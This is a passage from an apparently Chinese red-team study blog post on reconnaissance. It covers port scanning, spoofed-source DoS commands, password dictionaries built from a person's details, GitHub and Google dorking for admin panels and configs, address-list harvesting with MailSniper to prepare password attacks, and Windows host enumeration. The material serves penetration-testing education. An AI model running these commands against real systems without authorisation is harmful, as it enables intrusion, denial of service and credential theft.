80</code></pre><p>随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-PO禁止对主机列表。</p><pre><code class="hljs bash">host -l company.com | cut -d -f 4 | nmap -V -iL -</code></pre><p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给Nmap。上述命令用于GNU/Linux —— 其它系统进行区域传输时有不同的命令。</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a><strong>输出</strong></h4><pre><code class="hljs bash">-oN &lt;File&gt;-oX &lt;XML File&gt;-oG &lt;filespec&gt;</code></pre><p>Grep输出参考：<a href="http://www.unspecific.com/nmap-oG-output/">http://www.unspecific.com/nmap-oG-output/</a></p><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>安装:</p><pre><code class="hljs bash">$ sudo apt-get install git gcc make libpcap一dev$ git <span class="hljs-built_in">clone</span> https://github.com/ rober tdavidgr aham/ masscan$ <span class="hljs-built_in">cd</span> masscan$ make</code></pre><blockquote><p>该工具兼容Nmap的参数高级选项</p></blockquote><h4 id="高级选项"><a href="#高级选项" class="headerlink" title="高级选项"></a><strong>高级选项</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/01.png" alt="msscan"><br>命令：<code>sudo masscan --ports 1-10000 192.168.1.101 --adapter-ip 192.168.1.1</code></p><ul><li>-adapter-ip 指定发包的IP地址</li><li>-adapter-port 指定发包的源端口</li><li>-adapter-mac 指定发包的源MAC地址</li><li>-router-mac 指定网关的MAC地址</li><li>-exclude IP地址范围黑名单，防止masscan扫描</li><li>-excludefile 指定IP地址范围黑名单文件</li><li>-includefile，-iL 读取一个范围列表进行扫描</li><li>-wait 指定发送完包之后的等待时间，默认为10秒</li></ul><p>命令：<code>masscan -p 1-65535 192.168.1.101 --rate=100</code><br>在网络环境慢的情况下，快速扫描出存在端口与nmap配合</p><hr><h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><p>kali系统自带nbtscan，以及查看帮助说明</p><pre><code class="hljs bash">ice@iceH:~/Desktop$ whereis nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gzice@iceH:~/Desktop$ nbtscan NBTscan version 1.6.This is a free software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL 2+.Usage:nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) ......</code></pre><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/02.png" alt="nbtscan"><br>nbtscan扫描可以发现主机名、MAC addr等信息…</p><ul><li>扫描整个C段</li></ul><pre><code class="hljs bash">nbtscan -r 192.168.1.0/24</code></pre><ul><li>扫描一个范围</li></ul><pre><code class="hljs bash">nbtscan 192.168.1.1-100</code></pre><ul><li>以:分割显示结果</li></ul><pre><code class="hljs bash">nbtscan -v -s : 192.168.1.0/24</code></pre><ul><li>从文件读取扫描范围</li></ul><pre><code class="hljs bash">nbtscan -f &lt;File&gt;</code></pre><h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a><strong>高级用法</strong></h4><pre><code class="hljs bash">sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq</code></pre><pre><code class="hljs bash">ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105192.168.1.105 GOOGLE-28D12ECA 00U192.168.1.105 GOOGLE-28D12ECA 20U192.168.1.105 WORKGROUP       00G192.168.1.105 WORKGROUP       1eG192.168.1.105 WORKGROUP       1dU192.168.1.105 __MSBROWSE__ 01G192.168.1.105 MAC 00:0c:29:f5:84:34ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq192.168.1.105</code></pre><hr><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping3主要测试防火墙的拦截规则，对网络设备进行测试</p><h4 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a><strong>常用模式</strong></h4><ul><li>-0 -rawip IP原始报文</li><li>-1 -icmp ICMP模式</li><li>-2 -udp UDP模式</li><li>-8 -scan 扫描模式</li><li>-9 -listen 监听模式</li></ul><blockquote><p>SYN方式扫描主机端口</p></blockquote><pre><code class="hljs bash">hping3 --scan 445,135 -S 192.168.1.105</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/03.png" alt="hping3"></p><p>可以看到，目标主机回复了: S…A，代表SYN/ACK</p><blockquote><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）</p></blockquote><pre><code class="hljs bash">hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><h4 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a><strong>DRDDOS</strong></h4><blockquote><p>基于UDP的DOS</p></blockquote><pre><code class="hljs bash">hping3 -udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><p><strong>参考</strong></p><p><a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a>    –很详细用法的解释<br><a href="http://man.linuxde.net/hping3">http://man.linuxde.net/hping3</a></p><hr><h2 id="2、关联信息生成"><a href="#2、关联信息生成" class="headerlink" title="2、关联信息生成"></a>2、关联信息生成</h2><p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合<br>例如:赫尔巴斯亚基国<br>根据地域习惯、宗教、互联网开放信息等信息进行简要拆分，假设获取的信息如下:</p><ul><li>当地人爱好吃橙子</li><li>当地人信奉伊斯兰教</li><li>IPV4地址开放IP段</li><li>相关社交网络公 开的数据库</li></ul><p>根据宗教、习惯、IP地址、 开放数据支持…等，为后续的字典生成、鱼叉、水坑攻击铺下基石</p><h3 id="字典生成：pydictor"><a href="#字典生成：pydictor" class="headerlink" title="字典生成：pydictor"></a>字典生成：pydictor</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装:"></a><strong>安装:</strong></h4><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/LandGrey/pydictor</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/04.png" alt="安装"></p><h4 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/05.png" alt="生成字典"></p><p>命令：<code>python pydictor.py --sedb</code></p><pre><code class="hljs bash">python pydictor.py --sedb<span class="hljs-built_in">set</span> cname liwei<span class="hljs-built_in">set</span> sname lw Lwei<span class="hljs-built_in">set</span> ename zwell<span class="hljs-built_in">set</span> birth 19880916<span class="hljs-built_in">set</span> usedpwd liwei123456. liwei@19880916 lw19880916_123<span class="hljs-built_in">set</span> phone 18852006666<span class="hljs-built_in">set</span> uphone 15500998080<span class="hljs-built_in">set</span> hphone 76500100 61599000 01061599000<span class="hljs-built_in">set</span> email 33125500@qq.com<span class="hljs-built_in">set</span> email 13561207878@163.com<span class="hljs-built_in">set</span> email weiweili@gmail.com<span class="hljs-built_in">set</span> email wei010wei@hotmail.com<span class="hljs-built_in">set</span> postcode 663321 962210<span class="hljs-built_in">set</span> nickname zlili<span class="hljs-built_in">set</span> idcard 152726198809160571<span class="hljs-built_in">set</span> jobnum 20051230 100563<span class="hljs-built_in">set</span> otherdate 19591004 19621012<span class="hljs-built_in">set</span> otherdate 19870906 19880208<span class="hljs-built_in">set</span> usedchar tiger gof gamesthrones 176003 m0n5ter ppdogrun</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/06.png" alt="生成字典"></p><h4 id="合并去重"><a href="#合并去重" class="headerlink" title="合并去重"></a><strong>合并去重</strong></h4><pre><code class="hljs bash">python pydictor.py -tool uniqbiner /my/all/dict/</code></pre><h4 id="多字典文件组合工具"><a href="#多字典文件组合工具" class="headerlink" title="多字典文件组合工具"></a><strong>多字典文件组合工具</strong></h4><pre><code class="hljs bash">python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt</code></pre><p>参考详细：<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><hr><h2 id="3、开放漏洞情报"><a href="#3、开放漏洞情报" class="headerlink" title="3、开放漏洞情报"></a>3、开放漏洞情报</h2><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><ul><li>CVE：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li><li>Exploit-DB：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security：<a href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker：<a href="https://www.securitytracker.com/">https://www.securitytracker.com/</a></li></ul><h3 id="Search-Exploit一DB"><a href="#Search-Exploit一DB" class="headerlink" title="Search Exploit一DB"></a>Search Exploit一DB</h3><h4 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h4><p>利用 <code>searchsploit apache 5.3.12</code> ，搜索apache漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/07.png" alt="搜索漏洞"></p><h4 id="更新最新exp库"><a href="#更新最新exp库" class="headerlink" title="更新最新exp库"></a>更新最新exp库</h4><p>命令：<code>searchsploit -u</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/08.png" alt="更新最新exp库"></p><hr><h2 id="4、开源情报信息搜集-OSINT"><a href="#4、开源情报信息搜集-OSINT" class="headerlink" title="4、开源情报信息搜集(OSINT)"></a>4、开源情报信息搜集(OSINT)</h2><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><ul><li>百度：<a href="https://www.baidu.com/">https://www.baidu.com</a></li><li>谷歌：<a href="https://www.google.com/">https://www.google.com</a></li><li>必应：<a href="https://cn.bing.com/">https://cn.bing.com</a></li></ul><h3 id="在线接口"><a href="#在线接口" class="headerlink" title="在线接口"></a>在线接口</h3><ul><li><a href="http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com">http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com</a></li><li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></li><li><a href="http://sbd.ximcx.cn/">http://sbd.ximcx.cn/</a>  –在线子域名查询-接口光速版</li><li><a href="https://censys.io/certificates?q=.example.com">https://censys.io/certificates?q=.example.com</a></li><li><a href="https://crt.sh/?q=%25.example.com">https://crt.sh/?q=%25.example.com</a></li><li><a href="https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu">https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>  –查询DNS记录、侦查、研究</li><li><a href="https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com">https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com</a>  –和第一个一样</li><li><a href="https://findsubdomains.com/">https://findsubdomains.com/</a></li><li><a href="https://dnslytics.com/search?g=www.baidu.com">https://dnslytics.com/search?g=www.baidu.com</a>   –DNSlyrics</li><li><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a>   –DNS攻击面2次免费</li><li><a href="https://viewdns.info/">https://viewdns.info/</a>   –功能很多</li><li><a href="https://www.ipneighbour.com/#/lookup/114.114.114.114">https://www.ipneighbour.com/#/lookup/114.114.114.114</a>      –邻居发现</li><li><a href="https://securitytrails.com/list/apex_domain/baidu.com">https://securitytrails.com/list/apex_domain/baidu.com</a></li><li><a href="https://url.fht.im/">https://url.fht.im/</a></li><li><a href="http://api.hackertarget.com/hostsearch/?q=baidu.com">http://api.hackertarget.com/hostsearch/?q=baidu.com</a></li><li><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a>     –云悉（限制挺大）</li></ul><p>有几个挺好用的，自行挖掘…</p><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><ul><li><a href="https://github.com/rshipp/awesome-malware-analysis/blob/master/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/master/恶意软件分析大合集.md</a></li></ul><p>此网站极力推荐学习！！！</p><hr><h2 id="5、Github-Hacking"><a href="#5、Github-Hacking" class="headerlink" title="5、Github Hacking"></a>5、Github Hacking</h2><p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有Github存储库</p><ul><li>Repositories </li><li>Topics</li><li>Issues and pull requests </li><li>Code </li><li>Commits </li><li>Users </li><li>Wikis </li></ul><p>参考 :</p><ul><li>Searching for repositories </li><li>Searching topics</li><li>Searching code </li><li>Searching commits </li><li>Searching issues and pull requests </li><li>Searching users </li><li>Searching wikis </li><li>Searching in forks </li></ul><p>可以使用以上方式<code>搜索</code>页面或<code>高级搜索</code>页面搜索Github<br>您可以使用<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，和<code>&lt;=</code>搜索是<code>大于</code>，<code>大于或等于</code>，<code>小于</code>和<code>小于或等于</code>另一个值的值<br>下面会介绍如何搜索</p><h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a><strong>搜索仓库</strong></h3><table><thead><tr><th align="center">Query</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">&gt;_n</td><td align="center">cats stars:&gt;1000匹配关键字”cats”且star大于1000的仓库</td></tr><tr><td align="center">&gt;=<em>n</em></td><td align="center">cats topIcs:&gt;=5匹配关键字”cats”且标签数量大于等于5的仓库</td></tr><tr><td align="center">&lt;_n_</td><td align="center">cats size:&lt;10000匹配关键字”cats”且文件小于10KB的仓库</td></tr><tr><td align="center">&lt;=_n_</td><td align="center">cats stars:&lt;=50匹配关键字”cats”且star小于等于50的仓库</td></tr><tr><td align="center">_n_..*</td><td align="center">cats stars:10..*匹配关键字”cats”且star大于等于10的仓库</td></tr><tr><td align="center">*.._n_</td><td align="center">cats stars:*..10匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td align="center">n..n</td><td align="center">cats stars:10..50匹配关键字”cats”且star大于10且小于50的仓库</td></tr></tbody></table><h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><p><strong>注意事项</strong></p><ul><li>只能搜索小于384KB的文件 </li><li>只能搜索少于500,000个文件的存储库，登录的用户可以搜索所有公共存储库</li><li>除filename搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索language: Javascript无效,而是这样: amazing language:Javascript </li><li>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。您不能将以下通配符用作搜索查询的一部分“.、! “ = * ! ? # $ &amp; + ^ | ~ &lt;  &gt; ( ) { } [ ] 搜索将忽略这些符号</li></ul><p><strong>日期条件</strong></p><ul><li>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字</li><li>cats pushed:2016-04-30..2016-07-04  日期区间</li><li>cats created:&gt;=2017-04-01  创建时间</li></ul><p><strong>逻辑运算</strong></p><ul><li>AND、OR、NOT</li></ul><p><strong>排除运算</strong></p><ul><li>cats pushed:&lt;2012-07-05 language:java  搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</li></ul><p><strong>包含搜索</strong></p><ul><li>cats in:file            搜索文件中包含cats的代码<ul><li>cats in:path        搜索路径中包含cats的代码 <ul><li>cats in:path,file搜索路径、文件中包含cats的代码</li></ul></li></ul></li><li>console path:app/public language:javascript  搜索关键字 console，且语言为javascript，在app/public下的代码</li></ul><p><strong>主体搜索</strong></p><ul><li>user: USERNAME                                用户名搜索<ul><li>org: ‘’ORGNAME                                组织搜索 <ul><li>repo: USERNAME/REPOSITORY指定仓库搜索 </li></ul></li></ul></li></ul><p><strong>文件大小</strong></p><ul><li>size:&gt;1000        搜索大小大于1KB的文件</li></ul><p><strong>文件名称</strong></p><p><code>filename:config.php language:php</code> 搜索文件名为<code> config.php</code>，且语言为<code>php</code>的代码<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/09.png" alt="github hacking"></p><p>搜索Java项目配置文件: <code>mail filename:.properties</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png" alt="github hacking"></p><p><strong>扩展名</strong></p><p>搜索<code>extension:yaml mongolab.com</code> 中存在的代码信息等<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png" alt="github hacking"></p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p><code>https://github.com/unkl4b/gitmIner</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/12.png" alt="自动化工具"></p><hr><h2 id="6、google-hacking"><a href="#6、google-hacking" class="headerlink" title="6、google hacking"></a>6、google hacking</h2><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/13.png" alt="google hacking"></p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h3><ul><li>Intitle             包含标题 <ul><li>Intext          包含内容 <ul><li>filetype     文件类型 <ul><li>Info     基本信息 <ul><li>site 指定网站 </li><li>inurl 包含某个url</li><li>link 包含指定链接的网页 </li><li>cache 显示页面的缓存版本</li></ul></li><li>numberange搜索一个数字</li></ul></li></ul></li></ul></li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><ul><li>搜索目标包含后台的页面</li></ul><p>命令：<code>inurl:/admin intext: 后台管理系统</code></p><p><code>site:&quot;some-keywords.com&quot;intitle: login intext: intext: 管理|后台|登陆|用户名|密码|验证码|系统|帐号| manage|admin|login|system</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/14.png" alt="google hacking"></p><ul><li>搜索目标是否有目录列表</li></ul><p>命令：<code>intext: index of / | ../ | Parent Directory</code></p><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/15.png" alt="google hacking"></p><p>可看到存在目录列表很多url</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/16.png" alt="google hacking"></p><hr><h2 id="7、Git-all-secret"><a href="#7、Git-all-secret" class="headerlink" title="7、Git-all-secret"></a>7、Git-all-secret</h2><p>略过这个，等有精力再研究</p><hr><h2 id="8、mailsniper-ps1获取outlook所有联系人"><a href="#8、mailsniper-ps1获取outlook所有联系人" class="headerlink" title="8、mailsniper.ps1获取outlook所有联系人"></a>8、mailsniper.ps1获取outlook所有联系人</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook<br>outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h3><p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>将尝试 <code>Outlook Web Access（OWA）</code>和<code>Exchange Web服务（EWS）</code>的方法。此命令可用于从Exchange收集电子邮件列表 ：</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> <span class="hljs-string">&quot;outlook地址&quot;</span> <span class="hljs-literal">-UserName</span> <span class="hljs-string">&quot;域名/域用户名&quot;</span> <span class="hljs-literal">-Password</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><h4 id="可以自己搭建目标outlook在自己服务器上"><a href="#可以自己搭建目标outlook在自己服务器上" class="headerlink" title="可以自己搭建目标outlook在自己服务器上"></a><strong>可以自己搭建目标outlook在自己服务器上</strong></h4><p>此处使用klion的域环境模拟<br>在<code>mailsniper. ps1</code>最后一行加入以下代码,也可以通过传参的形式调用</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> mail.domain.com <span class="hljs-literal">-UserName</span> domain\username <span class="hljs-literal">-Password</span> Fall2016 <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><p>尝试使用我们传递的账号密码去登录目标的outlook，成功登录后会把邮件里的联系人都获取下来，并输出保存到文件里</p><h4 id="目标outlook在Office365"><a href="#目标outlook在Office365" class="headerlink" title="目标outlook在Office365"></a>目标outlook在Office365</h4><p>道理也是一样的，把<code>ExchHostname</code>指向<code>outlook.office365.com</code>即可，username使用完整的邮箱不要是用户名即可</p><pre><code class="hljs css"><span class="hljs-selector-tag">Get-GlobalAddressList</span> <span class="hljs-selector-tag">-ExchHostname</span> <span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.office365</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">-Username</span> 用户名@邮箱.....</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><ul><li><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/</a></li><li><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></li></ul><h3 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a><strong>工具地址</strong></h3><p><code>https://github.com/dafthack/mailsniper</code></p><hr><h2 id="9、内网渗透之信息收集"><a href="#9、内网渗透之信息收集" class="headerlink" title="9、内网渗透之信息收集"></a>9、内网渗透之信息收集</h2><h3 id="Windows（工作组和域）"><a href="#Windows（工作组和域）" class="headerlink" title="Windows（工作组和域）"></a>Windows（工作组和域）</h3><h4 id="检查当前shell权限"><a href="#检查当前shell权限" class="headerlink" title="检查当前shell权限"></a><strong>检查当前shell权限</strong></h4><pre><code class="hljs powershell">whoami /user &amp; whoami /priv</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/17.png" alt="检查当前shell权限"></p><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a><strong>查看系统信息</strong></h4><p>收集信息主机名-&gt;扮演角色</p><pre><code class="hljs powershell">systeminfo主机名:           WIN<span class="hljs-literal">-2008</span>OS 名称:          Microsoft Windows Server <span class="hljs-number">2008</span> R2 StandardOS 版本:          <span class="hljs-number">6.1</span>.<span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> Build <span class="hljs-number">7601</span>OS 制造商:        Microsoft CorporationOS 配置:          成员服务器OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:产品 ID:          <span class="hljs-number">55041</span><span class="hljs-literal">-628</span><span class="hljs-literal">-5044404</span><span class="hljs-literal">-84151</span>初始安装日期:     <span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">14</span>, <span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">07</span>系统启动时间:     <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">19</span>, <span class="hljs-number">18</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64<span class="hljs-literal">-based</span> PC处理器:           安装了 <span class="hljs-number">1</span> 个处理器。                  [<span class="hljs-number">01</span>]: Intel64 Family <span class="hljs-number">6</span> Model <span class="hljs-number">142</span> Stepping <span class="hljs-number">10</span> GenuineIntel ~<span class="hljs-number">1992</span> MhzBIOS 版本:        Phoenix Technologies LTD <span class="hljs-number">6.00</span>, <span class="hljs-number">2020</span>/<span class="hljs-number">2</span>/<span class="hljs-number">27</span>Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         